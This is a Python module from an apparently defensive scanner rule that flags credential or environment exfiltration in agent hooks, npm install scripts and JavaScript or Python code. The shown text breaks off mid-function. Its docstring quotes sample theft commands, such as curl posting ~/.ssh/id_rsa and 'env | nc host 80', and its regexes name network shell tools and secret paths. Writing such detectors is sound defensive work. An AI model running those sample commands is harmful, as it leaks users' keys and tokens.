"""Credentials, or the whole environment, sent off the machine by one command or call.

``ST-COMBO-EXFIL`` notices that a component can read a credential somewhere and can reach the
network somewhere. This rule is the narrower, stronger case: a single construct does both.

* **A command an agent or editor runs on its own** (``skilltotal.autorun``: hooks, MCP server
  launch commands, status line and credential helpers, plugin monitors and language servers,
  frontmatter hooks) that reads a credential and hands it to a network client: ``curl -d
  @~/.ssh/id_rsa https://...``, ``cat ~/.aws/credentials | curl --data-binary @- ...``, ``env |
  nc host 80``, ``$(gh auth token)`` sent to a host that is not GitHub. The example on the MCP
  security best-practices page (a client configuration whose startup command is ``npx ... && curl
  -X POST -d @~/.ssh/id_rsa ...``) is exactly this. A credential handed to its own client is not
  sent anywhere (``ssh -i ~/.ssh/key``, ``--kubeconfig``, a container mount ``-v ~/.aws:...``), and
  a provider's token sent to that provider (``gh auth token`` to ``api.github.com``) is its use.
* **An npm install-time script** (``preinstall``, ``install``, ``postinstall``, ``prepare``) that
  does the same, inline or through a shell script it runs.
* **A shell script one of those runs that collects first and sends later**: a line that writes a
  credential, the environment or a login token to a file or variable (``cat ~/.aws/credentials >>
  "$out"``), and a later line in which a network client uploads it (``curl --data-binary
  @"$out" ...``), the shape of the November 2026 CI and install-time stealers.
* **Code that passes the whole process environment into a network request**: ``fetch(url, {body:
  JSON.stringify(process.env)})``, ``requests.post(url, json=dict(os.environ))``, directly or
  through a variable. The environment is where a machine keeps its tokens (CI secrets, cloud keys,
  ``NPM_TOKEN``), and posting all of it is the first thing dependency-confusion and install-time
  stealers do. One named variable sent as a header is ordinary API use and is not matched, nor is
  the environment handed to a child process or written to a local file, nor what a helper reads
  from it (``token = resolve_token(os.environ)``, ``resolveHost(process.env)``).

Detection patterns below are string literals and parsing; nothing here runs or sends anything.
"""

from __future__ import annotations

import ast
import re
from bisect import bisect_right

from skilltotal.autorun import AutorunCommand, autorun_commands
from skilltotal.file_index import FileIndex, IndexedFile
from skilltotal.models import Capability, Evidence, Severity, ThreatClass
from skilltotal.scanners.base import (
    MAX_EVIDENCE_SCANNED,
    RuleSpec,
    Scanner,
    ScanResult,
    _finding_from_rule,
    aggregated_review,
)
from skilltotal.scanners.install_scripts import _NPM_LIFECYCLE_SCRIPTS, npm_install_commands
from skilltotal.scanners.sensitive_paths import _STRONG_PATHS

RULE_ID = "ST-SECRET-EXFIL"
# The note for a JavaScript file the environment-send check stopped short in (models.UNANALYZED).
ENV_SEND_PARTLY_READ = "Environment sends partly analyzed"

# --- commands -------------------------------------------------------------------------------------
# The home directory written as a variable reads as `~`, so `$HOME/.npmrc` is `~/.npmrc`.
_HOME = re.compile(
    r"\$\{?HOME\}?|\$\{?USERPROFILE\}?|\$env:(?:HOME|USERPROFILE)\b|%USERPROFILE%|%HOMEPATH%",
    re.IGNORECASE,
)
# A program that sends data over the network, at the start of a command or a pipeline stage.
_NET_CLIENT = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:sudo\s+)?(?:curl|wget|nc|ncat|netcat|socat|telnet|ftp|tftp|scp|sftp|"
    r"rsync|Invoke-WebRequest|Invoke-RestMethod|iwr|irm)(?=$|[\s;&|)`'\"])",
    re.IGNORECASE,
)
# The same from inline code (`node -e "..."`, `python -c "..."`, PowerShell).
_INLINE_NET = re.compile(
    r"\bfetch\s*\(|\bhttps?\.(?:request|get)\s*\(|\baxios\b|\bXMLHttpRequest\b|\burlopen\s*\(|"
    r"\brequests\.(?:post|put|patch|get)\s*\(|\bhttpx\.\w+\s*\(|Net\.WebClient|"
    r"\bUpload(?:String|File|Data)\s*\(|\bsendBeacon\s*\(",
    re.IGNORECASE,
)
# Commands that print a login token. Sent to that provider's own hosts, the token is being used.
_TOKEN_COMMANDS = (
    (re.compile(r"\bgh\s+auth\s+token\b"), ("github.com", "githubusercontent.com")),
    (re.compile(r"\bgcloud\s+auth\s+print-(?:access|identity)-token\b"),
     ("googleapis.com", "google.com")),
    (re.compile(r"\baz\s+account\s+get-access-token\b"),
     ("azure.com", "microsoft.com", "windows.net", "azure.net", "microsoftonline.com")),
    (re.compile(r"\bsecurity\s+find-(?:generic|internet)-password\b"), ()),
)
# The whole environment: `env` / `printenv` with no command after them, `/proc/self/environ`,
# PowerShell's `Env:` drive, and the same in inline code.
_ENV_DUMP = re.compile(
    r"(?:^|[\s;&|(`'\"])(?:printenv|env)\s*(?=$|[|;&)`'\">])"
    r"|/proc/(?:self|\d+)/environ\b"
    r"|\b(?:Get-ChildItem|gci|dir|ls)\s+env:"
    r"|\[(?:System\.)?Environment\]::GetEnvironmentVariables\(\s*\)"
    r"|JSON\.stringify\(\s*process\.env\s*\)"
    r"|\b(?:dict|str|repr)\(\s*os\.environ\s*\)",
    re.IGNORECASE,
)
# A credential handed to its own client, a container mount or a tool's config option: read
# locally to authenticate, not sent anywhere. Checked on the text of the command stage before
# the path (the shapes sensitive_paths also treats as not a read).
_HANDED_TO_CLIENT = re.compile(
    r"(?:(?<![\w-])-i\s*=?\s*|\bIdentityFile[=\s]+|--identity(?:-file)?[=\s]+|\bssh-add\s+|"
    r"\bssh-keygen\b[^|;&\n]*\s-f\s*|--kubeconfig[=\s]+|\bKUBECONFIG=|"
    r"\b(?:AWS_SHARED_CREDENTIALS_FILE|AWS_CONFIG_FILE|GOOGLE_APPLICATION_CREDENTIALS|"
    r"SSH_KEY(?:_PATH)?|GIT_SSH_KEY)=|(?<![\w-])-v\s+|--volume[=\s]+|"
    r"--mount[=\s]+\S*?(?:source|src)=|--(?:cert|key|cacert|capath|netrc-file)[=\s]+|"
    r"(?<![\w-])-E\s+|\b(?:mkdir|chmod|chown|test)\b[^|;&\n]*|\[\[?\s+-[efsr]\s+)"
    r"[\"']?[^\s\"'|;&]*$"
)
_STAGE_BREAK = re.compile(r"[;&|\n]|\$\(|`")
_URL_HOST = re.compile(r"https?://([^/\s\"'`:?#]+)", re.IGNORECASE)
# The instance-metadata address reads credentials only when asked for them; how that is sent on
# is a different question, left to the sensitive-path rule and the combination.
_METADATA = re.compile(r"169\.254\.169\.254")


_STAGE_WINDOW = 300


def _stage_before(text: str, at: int) -> str:
    """The text of the command stage (pipeline element, list element) up to offset ``at``, at
    most the last few hundred characters of it (bounded, so many paths stay linear)."""
    start = max(0, at - _STAGE_WINDOW)
    for m in _STAGE_BREAK.finditer(text, start, at):
        start = m.end()
    return text[start:at]


def _hosts(text: str) -> list[str]:
    return [m.group(1).lower() for m in _URL_HOST.finditer(text)]


def secret_upload(command: str, env: str = "") -> tuple[int, int] | None:
    """The span (in ``command``) of a credential, a token command or an environment dump that
    the same command sends with a network client, or None.

    ``env`` holds the values the command is started with: a credential path handed over through
    one is read by the command as well, but only ``command`` can run a network client.
    """
    text = _HOME.sub("~", command)
    if not (_NET_CLIENT.search(text) or _INLINE_NET.search(text)):
        return None
    for m in _STRONG_PATHS.finditer(text):
        if _METADATA.match(m.group(0)):
            continue
        if _HANDED_TO_CLIENT.search(_stage_before(text, m.start())):
            continue
        return _original_span(command, text, m.start(), m.end())
    if env and any(
        not _METADATA.match(m.group(0)) for m in _STRONG_PATHS.finditer(_HOME.sub("~", env))
    ):
        hit = _NET_CLIENT.search(text) or _INLINE_NET.search(text)
        return _original_span(command, text, hit.start(), hit.end()) if hit else None
    m = _ENV_DUMP.search(text)
    if m:
        return _original_span(command, text, m.start(), m.end())
    for pattern, own_hosts in _TOKEN_COMMANDS:
        m = pattern.search(text)
        if m is None:
            continue
        hosts = _hosts(text)
        if own_hosts and hosts and all(h.endswith(own_hosts) for h in hosts):
            continue  # the provider's token sent to the provider: that is how it is used
        return _original_span(command, text, m.start(), m.end())
    return None


def _original_span(original: str, normalized: str, start: int, end: int) -> tuple[int, int]:
    """Map a span of the home-normalized text back onto the original command (approximately:
    each replaced variable shortened the text before it)."""
    if original == normalized:
        return start, end
    shift = 0
    for m in _HOME.finditer(original):
        if m.start() - shift >= start:
            break
        shift += len(m.group(0)) - 1
    return start + shift, min(len(original), end + shift)


# --- code: the whole environment into a network request -------------------------------------------
_JS_SUFFIXES = (".js", ".mjs", ".cjs", ".jsx", ".ts", ".tsx", ".mts", ".cts")
# `process.env` itself, not one of its variables (`process.env.X`, `process.env["X"]`).
_JS_WHOLE_ENV = re.compile(r"(?<![\w$.])process\.env(?!\s*(?:\?\.|\.)\s*[\w$]|\s*\[|[\w$])")
# A name followed by a property read (`env.TOKEN`, `env?.TOKEN`, `env['TOKEN']`): one variable of
# an environment alias, not the environment. A method call (`payload.toString()`) still carries it.
# `process.env` that is tested or listed, not passed on: `typeof process.env`, `Object.keys(
# process.env)` (the names only), `k in process.env`, `process.env && ...`, `process.env === x`,
# `process.env ? a : b`.
_JS_ENV_NOT_VALUE_BEFORE = re.compile(
    r"(?:\btypeof\s+|\bObject\s*\.\s*(?:keys|getOwnPropertyNames)\s*\(\s*|\bin\s+)$"
)
_JS_ENV_NOT_VALUE_AFTER = re.compile(r"\s*(?:[=!]==?|&&|\?(?!\.))")
# Bounded, and with no two whitespace runs side by side: `\s*(?:\?\.)?\s*\[` split one long run of
# blank lines every possible way, so `.match()` after a name followed by 40,000 newlines took 26 s.
_JS_MEMBER_READ = re.compile(
    r"\s{0,200}(?:(?:\?\.|\.)\s{0,200}[\w$]{1,200}(?![\w$])(?!\s{0,200}\()|(?:\?\.\s{0,200})?\[)"
)
_JS_SINK = re.compile(
    r"(?<![\w$.])(?:fetch|axios(?:\.(?:post|put|patch|request|get))?|got(?:\.(?:post|put|patch))?|"
    r"needle|ky(?:\.(?:post|put|patch))?|superagent\.(?:post|put|patch)|"
    r"(?:https?|http2)\.(?:request|get)|request(?:\.(?:post|put|patch))?|\$\.(?:post|ajax)|"
    r"navigator\.sendBeacon|undici\.request|ofetch)\s*\("
)
# `.send(` / `.write(` / `.end(` on a request or socket the same file opens.
_JS_SEND = re.compile(r"\.(?:send|write|end)\s*\(")
# The process's own output streams: a log line written there stays on the machine.
_JS_LOCAL_STREAM = re.compile(r"(?:\bprocess\s*\.\s*(?:stdout|stderr)|\bconsole)\s*$")
_JS_OPENS_CHANNEL = re.compile(
    r"\b(?:https?|http2)\.request\s*\(|\bnet\.(?:connect|createConnection)\s*\(|"
    r"\btls\.connect\s*\(|\bnew\s+(?:XMLHttpRequest|WebSocket)\s*\(|\bdgram\.createSocket\s*\("
)
# A shell command run from JavaScript with a network client in it.
_JS_EXEC = re.compile(r"(?<![\w$.])(?:exec|execSync|spawn|spawnSync|execFile|execFileSync)\s*\(")
_SHELL_NET = re.compile(r"\b(?:curl|wget|nc|ncat)\b")
_JS_DECLARED = re.compile(r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)")
_JS_ASSIGN = re.compile(
    r"\b(?:const|let|var)\s+([A-Za-z_$][\w$]*)\s*=(?![=>])"
    r"|(?<![\w$.])([A-Za-z_$][\w$]*)(?:\s*\.\s*[A-Za-z_$][\w$]*|\[[^\]\n]{0,80}\])*\s*=(?![=>])"
)
_LOCAL_URL = re.compile(
    r"""^\s*['"`]https?://(?:localhost|127\.\d+\.\d+\.\d+|\[::1\]|0\.0\.0\.0)(?:[:/'"`]|$)"""
)
_ARGS_LIMIT = 4000
# Bounds for a crafted file (a real one has a handful of each).
_MAX_ENV_USES = 200
_MAX_TAINTED = 50
_MAX_CALLS = 2000
_ASSIGN_WINDOW = 800
_CONTINUATION = set("=+-*/%,(?:&|[{.!<>")
_CONTINUES_LINE = _CONTINUATION | {")", "]", "}"}


def _code_offset(f: IndexedFile, offset: int) -> bool:
    """True for code: not a comment, and not a string unless inside the ``${...}`` of a
    template literal (a command built as a template with the environment interpolated)."""
    if f.in_c_comment(offset):
        return False
    if not f.in_c_string(offset):
        return True
    span = f.string_span_at(offset)
    if span is None or f.text[span[0]] != "`":
        return False
    return f.text.rfind("${", span[0], offset) > f.text.rfind("}", span[0], offset)


def _skip_string(text: str, i: int, stop: int) -> int:
    quote = text[i]
    k = i + 1
    while k < stop:
        ch = text[k]
        if ch == "\\":
            k += 2
            continue
        if ch == quote:
            return k + 1
        if ch == "\n" and quote != "`":
            return k
        k += 1
    return stop


def _call_args(text: str, open_at: int) -> int | None:
    """Offset of the ``)`` closing the call whose ``(`` is at ``open_at`` (bounded), or None."""
    depth, i = 0, open_at
    stop = min(len(text), open_at + _ARGS_LIMIT)
    while i < stop:
        ch = text[i]
        if ch in "'\"`":
            i = _skip_string(text, i, stop)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth == 0:
                return i
        i += 1
    return None


def _same_statement(seg: str) -> bool:
    """True when nothing in ``seg`` (the text after an ``=``) ends the assignment's statement."""
    depth, i, n = 0, 0, len(seg)
    last = "="
    while i < n:
        ch = seg[i]
        if ch in "'\"`":
            i = _skip_string(seg, i, n)
            last = "x"
            continue
        if ch == "{" and (last == ")" or (last == ">" and seg[:i].rstrip().endswith("=>"))):
            # A function body: what it uses is not the value being assigned (a bundled module
            # `var require_x = __commonJS({ "x.js"(exports) { ... } })` is not its contents).
            return False
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
            if depth < 0:
                return False
        elif ch in ";," and depth == 0:
            return False  # the end of the statement, or of one declarator / parameter
        elif ch == "\n" and depth == 0:
            rest = seg[i + 1 :].lstrip()
            if last not in _CONTINUATION and rest and rest[0] not in _CONTINUES_LINE:
                return False
        if not ch.isspace():
            last = ch
        i += 1
    return True


def _assignment(
    text: str, pos: int, declared: frozenset[str] = frozenset(),
) -> tuple[str, int] | None:
    """The variable whose assignment statement holds offset ``pos``, and where that statement
    starts, if any.

    A parameter default (`function f(env = process.env)`) is not one: the name is local to a
    function, and every other function in the file may use the same name for something else. A
    property set on an object (`loot.env = process.env`) names the object only when the file
    declares it; a parameter or a module object (`exports.x = ...`) is not the code's payload.
    """
    start = max(0, pos - _ASSIGN_WINDOW)
    window = text[start:pos]
    last = None
    for m in _JS_ASSIGN.finditer(window):
        last = m
    if last is None or not _same_statement(window[last.end():]):
        return None
    if last.group(1):
        return last.group(1), start + last.start()
    if window[: last.start()].rstrip(" \t").endswith(("(", ",")):
        return None
    name = last.group(2)
    member = last.group(0)[len(name):].lstrip().startswith((".", "["))
    if member and name not in declared:
        return None
    return name, start + last.start()


_BRACE = re.compile(r"[{}]")


class _Blocks:
    """The ``{ ... }`` blocks of a file's code, to tell which block a statement is in.

    A name holds the environment only in the block where it was given it (with the blocks inside
    that one): a large bundle reuses short names (``env``, ``field``, ``parts``) in hundreds of
    unrelated functions, and following a name across the whole file joins them all up.
    """

    def __init__(self, f: IndexedFile) -> None:
        self.end = len(f.text)
        self.opens: list[int] = []
        self.closes: list[int] = []
        self.parent: list[int] = []
        stack: list[int] = []
        for m in _BRACE.finditer(f.text):
            at = m.start()
            if not _code_offset(f, at):
                continue
            if f.text[at] == "{":
                self.parent.append(stack[-1] if stack else -1)
                self.opens.append(at)
                self.closes.append(self.end)  # until its close is found
                stack.append(len(self.opens) - 1)
            elif stack:
                self.closes[stack.pop()] = at

    def around(self, pos: int) -> tuple[int, int]:
        """The innermost block holding ``pos`` (the whole file at the top level)."""
        i = bisect_right(self.opens, pos) - 1
        # The block opened last before pos holds it, or one of the blocks around that one does.
        while i >= 0 and self.closes[i] < pos:
            i = self.parent[i]
        return (self.opens[i], self.closes[i] + 1) if i >= 0 else (0, self.end)


def _options_start(text: str, start: int, end: int) -> int:
    """Where the last top-level argument of the call text[start:end] begins, when it is an object
    literal (a process call's options); ``end`` otherwise."""
    depth, i, last = 0, start, start
    while i < end:
        ch = text[i]
        if ch in "'\"`":
            i = _skip_string(text, i, end)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "," and depth == 0:
            last = i + 1
        i += 1
    return last if text[last:end].lstrip().startswith("{") else end


def _first_arg_end(text: str, start: int, end: int) -> int:
    """Where the first top-level argument of the call text[start:end] ends."""
    depth, i = 0, start
    while i < end:
        ch = text[i]
        if ch in "'\"`":
            i = _skip_string(text, i, end)
            continue
        if ch in "([{":
            depth += 1
        elif ch in ")]}":
            depth -= 1
        elif ch == "," and depth == 0:
            return i
        i += 1
    return end


# Calls that put their argument into the request as it is: the environment passed through one
# of these into a URL is sent.
_JS_ENCODERS = frozenset({
    "stringify", "btoa", "from", "encodeURIComponent", "encodeURI", "escape", "toString",
    "URLSearchParams", "String", "entries", "keys", "values", "assign",
})
# A match starts only where a name starts, and both runs are bounded: searched over a long name (or
# a long run of spaces) before `(`, every later start position re-read the rest of it (quadratic).
_JS_CALLEE = re.compile(r"(?<![\w$])([A-Za-z_$][\w$]{0,200})\s{0,200}$")


def _config_lookup(text: str, start: int, pos: int) -> bool:
    """True if the environment at ``pos`` is an argument of a call (inside text[start:pos]) to a
    function of the code's own, such as ``chatCompletionsUrl(process.env)``: the environment is
    read there to build the address, not put into it. An encoder (``JSON.stringify``, ``btoa``)
    does put it in."""
    depth, i = 0, pos - 1
    while i >= start:
        ch = text[i]
        if ch in ")]}":
            depth += 1
        elif ch in "([{":
            if depth == 0:
                if ch != "(":
                    return False
                callee = _JS_CALLEE.search(text, start, i)
                return bool(callee) and callee.group(1) not in _JS_ENCODERS
            depth -= 1
        i -= 1
    return False


def _handed_to_helper(text: str, start: int, pos: int, own: frozenset[str]) -> bool:
    """True if the environment at ``pos`` is an argument (directly or inside an object or array
    literal) of a call in text[start:pos] to a function the file does not define and that is not
    an encoder: ``const host = resolveHost(process.env)``, ``resolveContext({env: process.env})``.
    What such a call returns is what it read from the environment (a host, a session, a key), not
    the environment. A function the file defines itself may hand it back, so it still counts."""
    depth, i = 0, pos - 1
    while i >= start:
        ch = text[i]
        if ch in ")]}":
            depth += 1
        elif ch in "([{":
            if depth == 0 and ch == "(":
                callee = _JS_CALLEE.search(text, start, i)
                if not callee:
                    return False
                name = callee.group(1)
                return name not in _JS_ENCODERS and name not in own
            if depth > 0:
                depth -= 1
        i -= 1
    return False


_JS_DEFINES = re.compile(
    r"\bfunction\s{0,20}\*?\s{0,20}([A-Za-z_$][\w$]{0,200})\s*\("
    r"|(?<![\w$.])([A-Za-z_$][\w$]{0,200})\s{0,20}[:=]\s{0,20}(?:async\s+)?"
    r"(?:function\b|\([^()]{0,200}\)\s{0,20}=>|[A-Za-z_$][\w$]{0,200}\s{0,20}=>)"
    r"|^[ \t]*(?:static\s+)?(?:async\s+)?([A-Za-z_$][\w$]{0,200})\s*\([^()\n]{0,200}\)\s*\{",
    re.MULTILINE,
)
_JS_NOT_A_NAME = frozenset({"if", "for", "while", "switch", "catch", "with", "return", "function"})


def _js_own_functions(text: str) -> frozenset[str]:
    return frozenset(
        name for m in _JS_DEFINES.finditer(text)
        for name in m.groups() if name and name not in _JS_NOT_A_NAME
    )


def _js_env_dumps(f: IndexedFile) -> list[Evidence]:
    return _js_env_sends(f)[0]


def _js_env_sends(f: IndexedFile) -> tuple[list[Evidence], bool]:
    """Calls in a JavaScript file that send the whole environment, and whether a bound for a
    crafted file stopped the search short (a file padded with uses or calls before the real one).
    """
    text = f.text
    if "process.env" not in text:
        return [], False
    whole = [
        m.start() for m in _JS_WHOLE_ENV.finditer(text)
        if _code_offset(f, m.start())
        and not _JS_ENV_NOT_VALUE_BEFORE.search(text, max(0, m.start() - 40), m.start())
        and not _JS_ENV_NOT_VALUE_AFTER.match(text, m.end())
    ]
    if not whole:
        return [], False
    # Every use counts where a call's arguments are checked (a sorted list, searched by bisect);
    # only the first ones are followed into the variables they are assigned to.
    truncated = len(whole) > _MAX_ENV_USES
    seeds = whole[:_MAX_ENV_USES]
    declared = frozenset(_JS_DECLARED.findall(text))
    own = _js_own_functions(text)
    blocks = _Blocks(f)

    def holder(pos: int) -> tuple[str, int] | None:
        """The variable assigned the environment (or a name holding it) at ``pos``, unless it
        is only given what a helper read from it."""
        found_at = _assignment(text, pos, declared)
        if found_at and _handed_to_helper(text, found_at[1], pos, own):
            return None
        return found_at

    # (name, the block it holds the environment in), in the order the source gives them (dicts
    # keep it; a set's order changes with each process's string hashing), so the cap below always
    # keeps the same ones.
    tainted: dict[tuple[str, tuple[int, int]], None] = {}
    for pos in seeds:
        found_at = holder(pos)
        if found_at:
            tainted[(found_at[0], blocks.around(found_at[1]))] = None
    for _ in range(3):  # a payload built in a few steps (env -> object -> JSON -> base64)
        grown: dict[tuple[str, tuple[int, int]], None] = {}
        for name, (start, end) in tainted:
            uses = re.compile(rf"(?<![\w$.]){re.escape(name)}(?![\w$])").finditer(text, start, end)
            for k, m in enumerate(uses):
                if k >= _MAX_ENV_USES:
                    break
                if not _code_offset(f, m.start()) or _JS_MEMBER_READ.match(text, m.end()):
                    continue
                found_at = holder(m.start())
                if found_at and found_at[0] != name:
                    key = (found_at[0], blocks.around(found_at[1]))
                    if key not in tainted:
                        grown[key] = None
            if len(tainted) + len(grown) >= _MAX_TAINTED:
                truncated = True
                break
        if not grown:
            break
        tainted.update(grown)
    scopes: dict[str, list[tuple[int, int]]] = {}
    for name, scope in tainted:
        scopes.setdefault(name, []).append(scope)
    names = re.compile(
        rf"(?<![\w$.])(?:{'|'.join(re.escape(n) for n in sorted(scopes))})(?![\w$])"
    ) if scopes else None
    opens_channel = bool(_JS_OPENS_CHANNEL.search(text))
    # Where the environment, or a name holding it, appears: a call whose arguments hold none of
    # these cannot send it, so it is skipped without counting against _MAX_CALLS.
    marks = sorted({*whole, *(m.start() for m in names.finditer(text))} if names else whole)

    def near(open_at: int) -> bool:
        k = bisect_right(marks, open_at)
        return k < len(marks) and marks[k] < open_at + _ARGS_LIMIT

    def carries_env(start: int, end: int, url_end: int | None = None) -> bool:
        def sent(pos: int) -> bool:
            # In the address argument, the environment handed to the code's own URL builder
            # configures the request; it is not what the request carries.
            return url_end is None or pos >= url_end or not _config_lookup(text, start, pos)

        k = bisect_right(whole, start - 1)
        while k < len(whole) and whole[k] < end:
            if sent(whole[k]):
                return True
            k += 1
        if names is None:
            return False
        return any(
            _code_offset(f, m.start()) and not _JS_MEMBER_READ.match(text, m.end())
            and any(a <= m.start() < b for a, b in scopes[m.group(0)])
            and sent(m.start())
            for m in names.finditer(text, start, end)
        )

    found: list[Evidence] = []
    for pattern, needs_channel, needs_net_cmd in (
        (_JS_SINK, False, False), (_JS_SEND, True, False), (_JS_EXEC, False, True),
    ):
        if needs_channel and not opens_channel:
            continue
        calls = 0
        for m in pattern.finditer(text):
            open_at = m.end() - 1
            if not near(open_at):
                continue
            calls += 1
            if calls > _MAX_CALLS:
                truncated = True
                break
            if not _code_offset(f, m.start()):
                continue
            if pattern is _JS_SEND and _JS_LOCAL_STREAM.search(
                text, max(0, m.start() - 40), m.start()
            ):
                continue
            close = _call_args(text, open_at)
            if close is None:
                continue
            args = text[open_at + 1 : close]
            if _LOCAL_URL.match(args):
                continue
            if needs_net_cmd and not _SHELL_NET.search(args):
                continue
            # A process call's last argument, when it is an object, is its options: `env` there is
            # the environment the child runs in (pm2: `spawn('wget', [url], {env: process.env})`),
            # not data it sends. The command and its arguments are what can carry it out.
            end = _options_start(text, open_at + 1, close) if needs_net_cmd else close
            url_end = _first_arg_end(text, open_at + 1, close) if pattern is _JS_SINK else None
            if carries_env(open_at + 1, end, url_end):
                found.append(f.evidence_for_span(m.start(), close + 1))
                if len(found) >= MAX_EVIDENCE_SCANNED:
                    return found, False
    return found, truncated


# Python: modules whose calls reach the network, and the calls/methods that send data.
_PY_NET_MODULES = frozenset(
    {"requests", "httpx", "aiohttp", "urllib3", "urllib", "http", "socket", "smtplib",
     "websocket", "websockets", "ftplib", "pycurl", "grequests", "treq"}
)
_PY_SEND_LEAVES = frozenset(
    {"get", "post", "put", "patch", "delete", "head", "options", "request", "urlopen",
     "Request", "stream", "send", "sendall", "sendto", "sendmail", "send_message"}
)
# Methods on an object the code made (a session, a connection, a socket): `.get` is left out,
# since on anything but a network module it is a dictionary read.
_PY_METHOD_SENDS = frozenset(
    {"post", "put", "patch", "request", "send", "sendall", "sendto", "sendmail", "send_message",
     "urlopen"}
)
# Uses of `os.environ` that read one variable, test for one, or change the environment.
_PY_ENV_MEMBER = frozenset(
    {"get", "setdefault", "pop", "keys", "__getitem__", "__contains__", "__setitem__", "update",
     "clear", "popitem"}
)
_PY_SCOPES = (ast.FunctionDef, ast.AsyncFunctionDef, ast.Lambda)


class _PyImports:
    def __init__(self, tree: ast.AST) -> None:
        self.modules: dict[str, str] = {}  # local name -> module path
        self.names: dict[str, str] = {}  # local name -> module.attr
        for node in ast.walk(tree):
            if isinstance(node, ast.Import):
                for alias in node.names:
                    local = alias.asname or alias.name.split(".")[0]
                    self.modules[local] = alias.name if alias.asname else local
            elif isinstance(node, ast.ImportFrom) and node.level == 0 and node.module:
                for alias in node.names:
                    self.names[alias.asname or alias.name] = f"{node.module}.{alias.name}"

    def dotted(self, node: ast.expr) -> str | None:
        if isinstance(node, ast.Name):
            if node.id in self.names:
                return self.names[node.id]
            return self.modules.get(node.id, node.id)
        if isinstance(node, ast.Attribute):
            base = self.dotted(node.value)
            return f"{base}.{node.attr}" if base else None
        return None

    def network(self) -> bool:
        heads = {m.split(".")[0] for m in self.modules.values()}
        heads |= {n.split(".")[0] for n in self.names.values()}
        return bool(heads & _PY_NET_MODULES)


def _py_is_environ(node: ast.expr, imports: _PyImports) -> bool:
    return imports.dotted(node) == "os.environ"


def _py_env_dumps(f: IndexedFile) -> list[Evidence]:
    if "environ" not in f.text:
        return []
    try:
        tree = ast.parse(f.text)
    except (SyntaxError, ValueError, RecursionError, MemoryError):
        return []
    imports = _PyImports(tree)
    if not imports.network():
        return []
    parents: dict[int, ast.AST] = {}
    for parent in ast.walk(tree):
        for child in ast.iter_child_nodes(parent):
            parents[id(child)] = parent

    def whole_environ(node: ast.AST) -> bool:
        if not isinstance(node, (ast.Name, ast.Attribute)) or not _py_is_environ(node, imports):
            return False
        parent = parents.get(id(node))
        if isinstance(parent, ast.Subscript) and parent.value is node:
            return False  # os.environ["X"]
        if isinstance(parent, ast.Attribute) and parent.attr in _PY_ENV_MEMBER:
            return False  # os.environ.get("X")
        if isinstance(parent, ast.Compare) and node in parent.comparators:
            return False  # "X" in os.environ
        return True

    env_nodes = {id(n) for n in ast.walk(tree) if whole_environ(n)}
    if not env_nodes:
        return []

    # A name holds the environment in the function it was given it in (and the functions nested
    # in that one): a module reuses short names (`env`, `key`, `body`) in many unrelated functions,
    # and following a name across the whole file joined them all up.
    def scope_of(node: ast.AST) -> ast.AST:
        parent = parents.get(id(node))
        while parent is not None and not isinstance(parent, _PY_SCOPES):
            parent = parents.get(id(parent))
        return parent if parent is not None else tree

    chains: dict[int, list[ast.AST]] = {}

    def chain(scope: ast.AST) -> list[ast.AST]:
        if id(scope) not in chains:
            chains[id(scope)] = [scope] + ([] if scope is tree else chain(scope_of(scope)))
        return chains[id(scope)]

    def one_variable(node: ast.Name) -> bool:
        parent = parents.get(id(node))
        if isinstance(parent, ast.Subscript) and parent.value is node:
            return True  # env["X"] on a name assigned the environment
        return isinstance(parent, ast.Attribute) and parent.attr in _PY_ENV_MEMBER

    # The file's own functions, by name: what one returns is known, so the environment handed to
    # one (`token = resolve_token(os.environ)`) is followed only into a result that carries it.
    defs: dict[str, list[ast.AST]] = {}
    for node in ast.walk(tree):
        if isinstance(node, (ast.FunctionDef, ast.AsyncFunctionDef)):
            defs.setdefault(node.name, []).append(node)

    def own_function(call: ast.Call) -> list[ast.AST]:
        func = call.func
        if isinstance(func, ast.Name) and func.id not in imports.names:
            return defs.get(func.id, [])
        if (isinstance(func, ast.Attribute) and isinstance(func.value, ast.Name)
                and func.value.id in ("self", "cls")):
            return defs.get(func.attr, [])
        return []

    Tainted = set[tuple[ast.AST, str]]

    def carries(expr: ast.AST, scope: ast.AST, tainted: Tainted) -> bool:
        stack = [expr]
        while stack:
            node = stack.pop()
            if id(node) in env_nodes:
                return True
            if (isinstance(node, ast.Name) and not one_variable(node)
                    and any((s, node.id) in tainted for s in chain(scope))):
                return True
            if isinstance(node, ast.Call):
                functions = own_function(node)
                if functions:
                    if any(call_carries(node, fn, scope, tainted) for fn in functions):
                        return True
                    continue  # its arguments went in; what came back is its own result
            for child in ast.iter_child_nodes(node):
                # A child process's `env=` is the environment it runs in, not data it carries:
                # what it returns (its output, a queue line read from it) holds no secret.
                if isinstance(child, ast.keyword) and child.arg == "env":
                    continue
                stack.append(child)
        return False

    def call_carries(call: ast.Call, fn: ast.AST, scope: ast.AST, tainted: Tainted) -> bool:
        """True if the result of ``call`` to the file's own ``fn`` carries the environment."""
        if returns(fn, None):
            return True  # it returns the environment it reads itself
        params = [a.arg for a in (*fn.args.posonlyargs, *fn.args.args)]
        if isinstance(call.func, ast.Attribute) and params[:1] in (["self"], ["cls"]):
            params = params[1:]
        named = {*params, *(a.arg for a in fn.args.kwonlyargs)}
        rest_pos = fn.args.vararg.arg if fn.args.vararg else None
        rest_kw = fn.args.kwarg.arg if fn.args.kwarg else None
        given: list[tuple[str | None, ast.expr]] = []
        for i, arg in enumerate(call.args):
            if isinstance(arg, ast.Starred):
                given.append((None, arg))
            else:
                given.append((params[i] if i < len(params) else rest_pos, arg))
        for kw in call.keywords:
            if kw.arg == "env":
                continue
            given.append((kw.arg if kw.arg in named else rest_kw if kw.arg else None, kw.value))
        # A parameter that cannot be named (`*args` unpacked into it) is taken to come back out.
        return any(
            carries(arg, scope, tainted) and (param is None or returns(fn, param))
            for param, arg in given
        )

    returned: dict[tuple[int, str | None], bool] = {}

    def returns(fn: ast.AST, param: str | None) -> bool:
        """True if ``fn`` returns (or yields) its parameter ``param``, or with None, the
        environment it reads itself."""
        key = (id(fn), param)
        if key not in returned:
            returned[key] = True  # a recursive call meanwhile: assume it does
            inner: Tainted = {(fn, param)} if param else set()
            spread(inner, [a for a in assignments if fn in chain(scope_of(a))])
            returned[key] = any(
